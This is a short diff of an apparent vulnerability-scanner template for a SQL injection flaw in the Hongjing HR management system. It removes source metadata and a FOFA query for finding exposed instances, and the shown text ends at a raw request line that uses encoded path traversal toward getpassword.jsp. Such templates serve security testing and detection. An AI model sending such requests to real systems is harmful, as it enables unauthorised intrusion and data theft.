@@ -3,14 +3,8 @@ info:
   name: 宏景人力资源信息管理系统ajaxService存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/717aed7eeacf729dfcee96f13b083004
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 717aed7eeacf729dfcee96f13b083004
-    fofa: + fofa`icon_hash="947874108" || body='<div class="hj-hy-all-one-logo"' || app="HJSOFT-HCM"`
 http:
 - raw:
   - 'GET /templates/attestation/%2e%2e/%2e%2e/templates/index/getpassword.jsp HTTP/1.1
